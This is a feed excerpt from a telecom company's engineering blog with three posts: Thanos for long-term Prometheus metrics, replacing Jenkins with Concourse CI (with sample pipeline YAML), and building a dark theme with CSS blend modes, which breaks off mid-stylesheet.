        <title type="html"><![CDATA[Towards observability nirvana: infinite metric retention with Thanos]]></title>
        <id>metrics-unlimited-thanos</id>
        <link href="https://www.wgtwo.com/blog/metrics-unlimited-thanos"/>
        <updated>2020-01-28T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[In the current DevOps world, our industry relies on the ability to observe and monitorize our infrastructure and]]></summary>
        <content type="html"><![CDATA[<p>In the current DevOps world, our industry relies on the ability to observe and monitorize our infrastructure and
services. <strong>wgtwo</strong> is no exception here and as we are operating in the TelCo space
we wanted to know more about the usage patterns of our platform over days, months and even years.</p><p>Internally we have been running Prometheus for a long time with a fairly limited retention of 30 days. This did not
allow us to look far enough back in time to make the observations we wanted to.
Luckily for us there already was a solution out there that would fill our needs and in addition to that make our
monitoring stack more resilient. The solution is called <a href="https://thanos.io/" target="_blank" rel="noopener noreferrer">Thanos</a>.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="thanos">Thanos<a class="hash-link" href="#thanos" title="Direct link to heading">​</a></h2><p>Thanos was originally developed by a company called <a href="https://improbable.io/" target="_blank" rel="noopener noreferrer">Improbable</a> to provide long term storage
for Prometheus. It evolved into a much more complicated component which wildly improved the scalability of the
Prometheus monitoring Stack.</p><p>The basic functionality however is that Thanos will upload the metrics collected by Prometheus onto any service with a
S3-compatible API or any other storage target supported by the Prometheus remote write feature. For readability we
will only refer to it as S3 Storage as this is our storage target.</p><p>We shall briefly look at all those components before describing how we are leveraging Thanos to obtain a higher metric
retention and higher reliability.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="thanos-sidecar">Thanos Sidecar<a class="hash-link" href="#thanos-sidecar" title="Direct link to heading">​</a></h3><p>The Sidecar runs as the name suggests in the same pod as Prometheus and observes when Prometheus saves new storage
buckets on disk, which it does about every 2 hours. If configured to do so, it will upload those storage bucket into S3.
Another important feature is that it extends the Prometheus Pod with an API that can be used by Thanos Querier
as a Store API endpoint to query Prometheus metrics.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="thanos-store">Thanos Store<a class="hash-link" href="#thanos-store" title="Direct link to heading">​</a></h3><p>Thanos Store implements the Thanos Store API and makes the metric data stored in the S3 bucket available to the
Thanos Querier. To do that it observes the configured S3 Bucket and reads the metadata of the stored storage buckets
available in S3.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="thanos-querier">Thanos Querier<a class="hash-link" href="#thanos-querier" title="Direct link to heading">​</a></h3><p>Querier implements the Prometheus Query API and understands PromQL. It then sends the query using the aforementioned
Store API to all known Thanos Stores (discovered using service discovery) and awaits the metric information from the
stores, be it directly from Prometheus via the sidecar or metrics stored in S3 Object storage via Thanos Store.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="thanos-compactor">Thanos Compactor<a class="hash-link" href="#thanos-compactor" title="Direct link to heading">​</a></h3><p>It does not make a lot of sense to keep old metrics that are scraped every 15 or 30 seconds forever. At some point these
metrics would no longer be useful to make sense of your metrics. This is where
the Thanos Compactor comes in. It creates aggregates of old metrics based on rules. It will for example
aggregate metrics that are older than 30 days into 5 minute chunks. This saves resources and still gives you
almost the same accuracy when looking at longer timespans. After those metrics have been aggregated, they are
written back into the S3 bucket and the metadata gets updated.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="thanos-ruler">Thanos Ruler<a class="hash-link" href="#thanos-ruler" title="Direct link to heading">​</a></h3><p>The Ruler component is the Thanos equivalent of Recording Rules. It can look at all Store APIs and generate new metrics
according to the Recording Rules fed into the Ruler component. However since this rule processing is not done against a
local datastore, it is possible that these new metric datapoints will not always be generated as it relies on a reliable
data source to do this in the required intervals.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="architecture-in-a-cluster">Architecture in a Cluster<a class="hash-link" href="#architecture-in-a-cluster" title="Direct link to heading">​</a></h2><p><img alt="Thanos Architecture" src="/assets/images/thanos_architecture-45a1d9e2b04a1eea265ebeebfde7206f.png" width="701" height="471"></p><p>As we can see, there are quite a few things going on in this architectural view of the system, but on the other hand it
is fairly simple to understand as the components are nicely decoupled from each other.</p><p>An interesting thing here is that the drawing has multiple Prometheus instances with multiple sidecars. Thanos actually
allows for deduplication of timeseries data. The data uploaded from the sidecars contains information about which prometheus
instance the metrics are generated from, and adds that. The Querier can then deduplicate this data so that the metrics shown
in Grafana are consistent and do not come sometimes from Prometheus A and sometimes from Prometheus B.</p><p>This design also allows for an interesting other Use Case: querying multiple clusters. As
long as the storage location used by the sidecars for uploading the metrics is identical, the time series data is
available to the Thanos Store and therefor the Querier and Grafana.
That even allows to run Grafana, Querier and Store in a completely different part of the world if need be.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="is-it-worth-it">Is it worth it?<a class="hash-link" href="#is-it-worth-it" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_mojV" id="pros">Pros<a class="hash-link" href="#pros" title="Direct link to heading">​</a></h3><ul><li>highly available Prometheus</li><li>increased reliability (decoupled query component)</li><li>infinite metric storage</li><li>query multiple clusters from a single point</li><li>easy to scale</li></ul><h3 class="anchor anchorWithStickyNavbar_mojV" id="cons">Cons<a class="hash-link" href="#cons" title="Direct link to heading">​</a></h3><ul><li>more complex architecture</li><li>increased resource usage</li></ul><h2 class="anchor anchorWithStickyNavbar_mojV" id="what-are-the-biggest-benefits-for-us">What are the biggest benefits for us?<a class="hash-link" href="#what-are-the-biggest-benefits-for-us" title="Direct link to heading">​</a></h2><p>As stated in the beginning of this article one of our objectives for implementing Thanos was the increased
metric retention to be able to look back further in time.</p><p>The most interesting features for us are to be able to:</p><ul><li>analyze trends and identify anomalies within the mobile core network</li><li>visualize and graph service usage</li><li>predict service usage on peak days (think New Years Eve)</li><li>observe behaviour over multiple deployments (regions, customers and cloud providers)</li></ul><h2 class="anchor anchorWithStickyNavbar_mojV" id="summary">Summary<a class="hash-link" href="#summary" title="Direct link to heading">​</a></h2><p>Even though Thanos comes with an increased architectural and operational complexity, we have to say after running it for a while, we think it is totally worth it. We can make architecture decisions by looking further
back in time than before. It also has the additional advantage that a misconfiguration of a Prometheus deployment
does not pull down the whole stack as Prometheus is HA and only updates one at a time. If the deployment fails,
we can get notified and the deployment can be aborted. Also upgrades of the whole monitoring stack, can
now be done gradually, which is also a great advantage for us!</p>]]></content>
        <author>
            <name>Holger Ihrig</name>
            <uri>https://www.linkedin.com/in/hihrig/</uri>
        </author>
        <category label="infrastructure" term="infrastructure"/>
        <category label="observability" term="observability"/>
        <category label="prometheus" term="prometheus"/>
        <category label="thanos" term="thanos"/>
        <category label="kubernetes" term="kubernetes"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[We killed the butler: Replacing Jenkins with Concourse]]></title>
        <id>replacing-jenkins-with-concourse</id>
        <link href="https://www.wgtwo.com/blog/replacing-jenkins-with-concourse"/>
        <updated>2019-12-20T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[At wgtwo, we try to use CI/CD pipelines to automate all of our repetitive tasks when it comes to code and infrastructure deployment and testing, such as:]]></summary>
        <content type="html"><![CDATA[<p>At <strong>wgtwo</strong>, we try to use CI/CD pipelines to automate all of our repetitive tasks when it comes to code and infrastructure deployment and testing, such as:</p><ul><li>running unit tests on each pull request</li><li>building and running integration tests with bazel on every merge to the monorepo</li><li>building container images and upload them to the registry</li><li>scanning all images for security flaws</li><li>running acceptance tests in the staging environment</li><li>syncing secrets between different sources</li><li>notifying slack if changes are made in Kubernetes</li></ul><p>We had been using <a href="https://jenkins.io/" target="_blank" rel="noopener noreferrer">Jenkins</a> to run such pipelines, but having to configure it by navigating a web GUI made it difficult to maintain, redeploy, and upgrade, so we decided to look for alternatives.</p><p><img alt="Jenkins" src="/assets/images/jenkins-f2293a0585d8d609061bd297e685a661.png" width="1050" height="344"></p><p>The majority of our code lives in a monorepo, and we use Bazel to manage builds and tests.
We try to do all of our infrastructure configuration via <a href="https://www.gitops.tech/" target="_blank" rel="noopener noreferrer">gitops</a> so it was important that a continuous integration and deployment system not only play nicely with our existing structures, but be itself configurable from code.</p><p>We spent time investigating other options, and eventually settled on <strong><a href="https://concourse-ci.org/" target="_blank" rel="noopener noreferrer">Concourse</a>, a cloud-native CI/CD server where tasks are deployed in containers, and config is stored as yaml</strong>.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="infrastructure-as-code">Infrastructure as code<a class="hash-link" href="#infrastructure-as-code" title="Direct link to heading">​</a></h2><p>We run Concourse in Kubernetes, so the setup and configuration itself is all done with yaml files and kubectl. It's fast and easy to upgrade and redeploy.</p><p>Within Concourse, the pipeline configuration is entirely yaml-based; there are no buttons in the UI except for an abort/re-run button.</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">jobs:</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">- name: run-acceptance-tests-staging</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  plan:</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  - task: run-tests</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    config:</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      inputs:</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      - name: monorepo</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      run:</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        path: /bin/bash -c runtests.sh</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    on_failure:</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      put: notify-slack-ci</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p><img alt="Concourse task" src="/assets/images/concourse_task-5f5e8d20c17a76621005be33cc80337b.png" width="1506" height="576"></p><p>Pipelines are made up of jobs that run in series or parallel; jobs consist of tasks.
Pipelines, jobs and tasks are described in code and automatically visualised in the UI.
Changes to pipelines are applied by updating the yaml file and running Concourse's <a href="https://concourse-ci.org/fly.html" target="_blank" rel="noopener noreferrer">fly cli</a> tool.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="containerised-deployment">Containerised deployment<a class="hash-link" href="#containerised-deployment" title="Direct link to heading">​</a></h2><p>Concourse runs every job in its own container, which means that every job uses an entirely clean, reproducible environment. Any dependencies required for a task can be pre-installed in the image.
This is a huge improvement for us over Jenkins, where dependencies were installed to the entire worker node, and artifacts from previous builds were left lying about on the server.</p><p>We use docker containers, and we also run Concourse itself as a container, which means a bit of docker-in-docker magic.
It look a little work to build an image we were happy with, but beyond that it went surprisingly smoothly for us on the whole.
The only drawback is that we have to run images in privileged mode, but in our self-managed Kubernetes cluster this isn't really too much of an issue.</p><p>There were some challenges in figuring out what resources needed to be allocated; we settled on three worker nodes and a maximum of 2 active tasks per worker. We see a little bit of slowness some afternoons when the pull-requests are coming thick and fast, but the cluster remains stable. It would be nice to set some autoscaling here to cope with short-term peaks in load.</p><p><img alt="Concourse pipeline" src="/assets/images/concourse_pipeline-e3a037cb649aa0ca87e8e14058b459e7.png" width="2760" height="392"></p><h2 class="anchor anchorWithStickyNavbar_mojV" id="debugging">Debugging<a class="hash-link" href="#debugging" title="Direct link to heading">​</a></h2><p>Since the tasks all run in containers, it's easy to debug issues locally by running the same image on the laptop as is running in Concourse.
Alternatively, the <a href="https://concourse-ci.org/running-tasks.html#fly-execute" target="_blank" rel="noopener noreferrer">fly execute</a> cli tool runs a local project in a container in Concourse, a nice interim step when trying to get a deploy working.</p><p>The <a href="https://concourse-ci.org/builds.html#fly-intercept" target="_blank" rel="noopener noreferrer">fly intercept</a> tool offers a way to log into a running container in concourse to troubleshoot:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">$ fly intercept -j ecs-services</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">1: build #27, step: monorepo, type: get</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">2: build #27, step: notify-slack-ci, type: get</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">3: build #27, step: notify-slack-ci, type: put</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">4: build #27, step: run-acceptance-tests-staging, type: task</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">choose a container: 4</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">root@02f69d15-b7be-4f2e-43f7-24f549071bb1:/tmp/build/3a58ea39#</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><h2 class="anchor anchorWithStickyNavbar_mojV" id="resource-types-and-extending-concourse">Resource types and extending Concourse<a class="hash-link" href="#resource-types-and-extending-concourse" title="Direct link to heading">​</a></h2><p>There are a large number of <a href="https://github.com/concourse/concourse/wiki/Resource-Types" target="_blank" rel="noopener noreferrer">resource types</a> available for Concourse, making it fairly straightforwards to configure pipelines.</p><p>As resource types in Concourse are all based on containers, extending Concourse means introducing a new container that can be called from Concourse.</p><p>A resource type needs to implement the following executables/scripts:</p><ul><li>check (checking new versions of the resource, eg. is there a new pull request)</li><li>in (pulling a new version of the resource down, eg. download code from a pull request)</li><li>out (pushing a new version of the resource up, eg. push a build result to Github)</li></ul><p>These binaries need to be placed under /opt/resource in the docker container.
Concourse calls these binaries with JSON payload and optional parameters that can all be found <a href="https://concourse-ci.org/implementing-resource-types.html" target="_blank" rel="noopener noreferrer">here</a>.
What is done in those executables/scripts is up to the implementer, but it is really easy to extend concourse using this mechanism.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="learning-curve">Learning curve<a class="hash-link" href="#learning-curve" title="Direct link to heading">​</a></h2><p>The move from Jenkins to Concourse has overall been a very positive step for us. If there has been any drawback it's that implementing any brand new system usually means something of a learning curve, and Concourse is no exception.</p><p>The documentation is sometimes a bit minimal, but now that we have a number of pipelines up and running we're finding it easier and easier to add more.
Similarly, it took some time to settle on how to allocate resources such that we cope with load but aren't wasteful at quiet times.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="summary">Summary<a class="hash-link" href="#summary" title="Direct link to heading">​</a></h2><p>The biggest improvements of Concourse over Jenkins have been:</p><ul><li>clean UI, no clicky clicky</li><li>every build uses its own container - no shared dependencies or artifacts</li><li>configuration of Concourse in code (in Kubernetes) - easy to upgrade and redeploy Concourse</li><li>configuration of pipelines in code - good visibility into running tasks</li><li>wide range of resource types</li><li>ability to extend resources</li><li>easy to troubleshoot and debug</li></ul><p>Overall, we're pretty pleased with Concourse. There are a few features we're eagerly awaiting in future releases, such as re-running targeted builds, but for the most part it has been relatively straightforwards to import all our existing jobs from Jenkins and add more.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="references">References<a class="hash-link" href="#references" title="Direct link to heading">​</a></h2><ul><li><a href="https://github.com/concourse" target="_blank" rel="noopener noreferrer">https://github.com/concourse</a></li><li><a href="https://content.pivotal.io/blog/the-making-of-a-cloud-native-ci-cd-tool-the-concourse-journey" target="_blank" rel="noopener noreferrer">https://content.pivotal.io/blog/the-making-of-a-cloud-native-ci-cd-tool-the-concourse-journey</a></li><li><a href="https://github.com/karlkfi/concourse-dcind" target="_blank" rel="noopener noreferrer">https://github.com/karlkfi/concourse-dcind</a></li><li><a href="https://github.com/concourse/docker-image-resource/blob/master/assets/common.sh" target="_blank" rel="noopener noreferrer">https://github.com/concourse/docker-image-resource/blob/master/assets/common.sh</a></li><li><a href="https://concoursetutorial.com" target="_blank" rel="noopener noreferrer">https://concoursetutorial.com</a></li></ul>]]></content>
        <author>
            <name>Anna Kennedy</name>
            <uri>https://www.linkedin.com/in/annaken</uri>
        </author>
        <category label="infrastructure" term="infrastructure"/>
        <category label="CICD" term="CICD"/>
        <category label="devops" term="devops"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hacking dark themes with CSS blend modes]]></title>
        <id>hacking-dark-themes-with-css-blend-modes/</id>
        <link href="https://www.wgtwo.com/blog/hacking-dark-themes-with-css-blend-modes/"/>
        <updated>2019-06-25T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Like many other companies, Working Group Two has a number of applications which are]]></summary>
        <content type="html"><![CDATA[<p>Like many other companies, <a href="/">Working Group Two</a> has a number of applications which are
only available internally or to partners.
Our UI designer (that's me) prefers light backgrounds with dark text, but one of our
partners have wanted a dark theme for one of our applications for some time.
We haven't been able to prioritize this, but we were using CSS blend modes for a different project,
and wondered if we could use them to quickly put together a dark theme.</p><p>The application in this post is one of our partner portals, which follows the Material Design
guidelines. It’s built with <a href="https://vuejs.org/" target="_blank" rel="noopener noreferrer">Vue</a> and <a href="https://vuetifyjs.com/en/" target="_blank" rel="noopener noreferrer">Vuetify</a>,
but also has some custom components and JS plugins (for uploads, charts, etc).
It took two hours to create the dark theme and deploy it to production, and we'll walk
you through the whole process (with screenshots) in this post.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="what-are-css-blend-modes">What are CSS blend modes?<a class="hash-link" href="#what-are-css-blend-modes" title="Direct link to heading">​</a></h2><p>Mozilla has a <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode" target="_blank" rel="noopener noreferrer">page</a> which explains
the concept fairly well. In short, blend modes decide what should happen when two colors are
put on top of each other. The default blend mode is <code>normal</code>, which is what most people are used to.
As an example, the <code>normal</code> blend mode paints dark text on top of a light background on the
page you’re reading right now.</p><p>The application we have is light and we want it to be dark, so we need to look for blend modes that
can help with that. Scrolling through the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode" target="_blank" rel="noopener noreferrer">list at MDN</a>,
one mode in particular stands out:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">difference</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    The final color is the result of subtracting the darker of the two colors from the lighter one.</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    A black layer has no effect, while a white layer inverts the other layer's color.</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p><img alt="Starting point, mostly basic Vuetify" src="/assets/images/01-console-subs-light-075d22a876ee12009b47dd134e9085a1.png" width="1337" height="859">
<img alt="After applying" src="/assets/images/01-console-subs-difference-4045fc8e52600e88c507fea828b111fc.png" width="1337" height="859"></p><p>Okay, that’s actually not too bad. There are some obvious issues, like the color hues being
inverted and everything being way too dark, but it should be possible to make some adjustments.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="working-with-a-non-standard-blend-mode">Working with a non-standard blend mode<a class="hash-link" href="#working-with-a-non-standard-blend-mode" title="Direct link to heading">​</a></h2><p>The most jarring issue is that the colors have been inverted.
Our teal logo is now red, and the red "unlocked account" icon we use in development mode is now teal.
This is in line with the documentation for the <code>difference</code> blend mode, but luckily CSS also supports hue-rotation,
so we can just rotate the hue back 180 degrees. Our base style now looks like this:</p><div class="codeBlockContainer_I0IT language-css theme-code-block"><div class="codeBlockContent_wNvx css"><pre tabindex="0" class="prism-code language-css codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token selector" style="color:rgb(199, 146, 234)">html</span><span class="token selector class" style="color:rgb(199, 146, 234)">.dark-mode</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">   </span><span class="token property">mix-blend-mode</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> difference</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">   </span><span class="token property">filter</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">hue-rotate</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">180</span><span class="token unit">deg</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Hue is measured in degrees from 0 to 360, so we're flipping the hues twice.
Below, you can see a color wheel with no effects (1), with blend-mode (2), and with blend mode and hue rotate (3).
All the effects are applied to the same image here in your browser.</p><p>As you can see from the illustration, brightness and saturation
is not accounted for with hue-rotate, so most colors won't look the same.
They will have the same hue though, so semantic meaning (red = danger, green = safe) is preserved.<!-- -->\<!-- -->
We're lucky that our brand color doesn't change too much!</p><p>So, this fixes our colors, but we also have to do something about the darkness.
The whole application is pretty much pitch black, and to make it brighter we need to … turn down the brightness:</p><div class="codeBlockContainer_I0IT language-css theme-code-block"><div class="codeBlockContent_wNvx css"><pre tabindex="0" class="prism-code language-css codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token selector" style="color:rgb(199, 146, 234)">html</span><span class="token selector class" style="color:rgb(199, 146, 234)">.dark-mode</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">   </span><span class="token property">mix-blend-mode</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> difference</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">   </span><span class="token property">filter</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">hue-rotate</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">180</span><span class="token unit">deg</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">brightness</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">0.67</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Let's have a look <small>(click to enlarge)</small>:</p><p>That’s a lot better (blend modes are fun!). Our dark theme is close to done now,
but we have one problem remaining: shadows. Because of our blend mode, making
things darker means making them brighter, so all our shadows look like white glows.
Since our base color is white/light gray, we can’t simply change our shadows to white as there would be no contrast.
Our solution was to embrace the “glow” feel and change the shadows to brand colored glows <small>(click to enlarge)</small>:</p><p>As you might have noticed in the previous screenshot, we also made some other adjustments.
We made the logo white using a brightness filter, and we set the base font-weight to 700 (bold),
since contrast is lower in the dark theme.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="more-comparison-screenshots">More comparison screenshots<a class="hash-link" href="#more-comparison-screenshots" title="Direct link to heading">​</a></h2><p>The following gallery shows some screenshots with custom components and JavaScript plugins.
No additional CSS was written for any of the views <small>(click to enlarge)</small>:</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="conclusion">Conclusion<a class="hash-link" href="#conclusion" title="Direct link to heading">​</a></h2><p>All in all, it took around two hours to create this dark theme. Most of the time was
spent experimenting with different settings to get acceptable contrast ratios.
There are probably better ways of doing this, but this was incredibly quick,
and allowed us to deliver something we normally wouldn't be able to deliver.
Other than the shadows, nothing is particularly ugly, so we consider this a success.
The whole style sheet is just a couple of selectors :</p><div class="codeBlockContainer_I0IT language-css theme-code-block"><div class="codeBlockContent_wNvx css"><pre tabindex="0" class="prism-code language-css codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token selector" style="color:rgb(199, 146, 234)">html</span><span class="token selector class" style="color:rgb(199, 146, 234)">.dark-mode</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">mix-blend-mode</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> difference</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">filter</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">brightness</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">0.67</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">hue-rotate</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">180</span><span class="token unit">deg</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">font-weight</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">700</span><span class="token plain"> </span><span class="token important">!important</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token comment" style="color:rgb(105, 112, 152);font-style:italic">/* Glow for dropdown/card-hover*/</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token selector class" style="color:rgb(199, 146, 234)">.dark-mode</span><span class="token selector" style="color:rgb(199, 146, 234)"> </span><span class="token selector class" style="color:rgb(199, 146, 234)">.v-menu__content</span><span class="token selector punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token selector" style="color:rgb(199, 146, 234)"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token selector" style="color:rgb(199, 146, 234)"></span><span class="token selector class" style="color:rgb(199, 146, 234)">.dark-mode</span><span class="token selector" style="color:rgb(199, 146, 234)"> </span><span class="token selector class" style="color:rgb(199, 146, 234)">.v-card--hover</span><span class="token selector pseudo-class" style="color:rgb(199, 146, 234)">:hover</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">box-shadow</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">5</span><span class="token unit">px</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">20</span><span class="token unit">px</span><span class="token plain"> </span><span class="token color function" style="color:rgb(130, 170, 255)">rgba</span><span class="token color punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token color number" style="color:rgb(247, 140, 108)">142</span><span class="token color punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token color"> </span><span class="token color number" style="color:rgb(247, 140, 108)">255</span><span class="token color punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token color"> </span><span class="token color number" style="color:rgb(247, 140, 108)">252</span><span class="token color punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token color"> </span><span class="token color number" style="color:rgb(247, 140, 108)">0.74</span><span class="token color punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token selector class" style="color:rgb(199, 146, 234)">.dark-mode</span><span class="token selector" style="color:rgb(199, 146, 234)"> </span><span class="token selector class" style="color:rgb(199, 146, 234)">.logo</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">filter</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token function" 